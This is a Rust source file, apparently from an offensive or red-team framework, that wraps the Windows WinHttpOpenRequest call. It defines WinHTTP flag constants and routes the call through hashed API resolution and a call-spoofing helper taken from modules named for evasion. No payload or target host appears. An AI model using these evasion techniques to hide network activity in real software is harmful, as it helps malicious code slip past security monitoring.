use crate::nt::types::*;
use crate::techniques::evasion::dinamic_api_resolution::get_winhttp_base;
use crate::techniques::evasion::execution::user_mode_call::user_mode_call_with_spoof;

// Documentación oficial:
// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest

// Flags para dwFlags en WinHttpOpenRequest
pub const WINHTTP_FLAG_SECURE: DWORD = 0x00800000; // Activa SSL/TLS (HTTPS)
pub const WINHTTP_FLAG_ESCAPE_PERCENT: DWORD = 0x00000004;
pub const WINHTTP_FLAG_NULL_CODEPAGE: DWORD = 0x00000008;
pub const WINHTTP_FLAG_ESCAPE_DISABLE: DWORD = 0x00000040;
pub const WINHTTP_FLAG_ESCAPE_DISABLE_QUERY: DWORD = 0x00000080;
pub const WINHTTP_FLAG_BYPASS_PROXY_CACHE: DWORD = 0x00000100;
pub const WINHTTP_FLAG_REFRESH: DWORD = 0x00000100;

// Constantes estándar de conveniencia
pub const WINHTTP_NO_REFERER: LPCWSTR = std::ptr::null();
pub const WINHTTP_DEFAULT_ACCEPT_TYPES: *const LPCWSTR = std::ptr::null();

// Crea un handle de petición HTTP
pub fn win_http_open_request(
    h_connect: HINTERNET,              // in - handle conexión http
    pwsz_verb: LPCWSTR,                // in_opt - verbo http get post
    pwsz_object_name: LPCWSTR,         // in_opt - recurso o ruta destino
    pwsz_version: LPCWSTR,             // in_opt - versión protocolo http
    pwsz_referrer: LPCWSTR,            // in_opt - url documento referente
    ppwsz_accept_types: *const LPCWSTR,// in_opt - array tipos mime aceptados
    dw_flags: DWORD,                   // in - flags como ssl tls
) -> Result<HINTERNET, String> { // ret - handle petición o error
    let api_hash = 0x98c52c1e; // unique_hash("WinHttpOpenRequest")
    let winhttp_base = unsafe { get_winhttp_base().map_err(|e| e.to_string())? };

    let handle = user_mode_call_with_spoof(
        winhttp_base,
        api_hash,
        h_connect as usize,
        pwsz_verb as usize,
        pwsz_object_name as usize,
        pwsz_version as usize,
        pwsz_referrer as usize,
        ppwsz_accept_types as usize,
        dw_flags as usize,
        0,
    )?;

    if handle == 0 {
        Err(String::from("WinHttpOpenRequest retornó NULL (error al crear la petición HTTP)"))
    } else {
        Ok(handle as HINTERNET)
    }
}
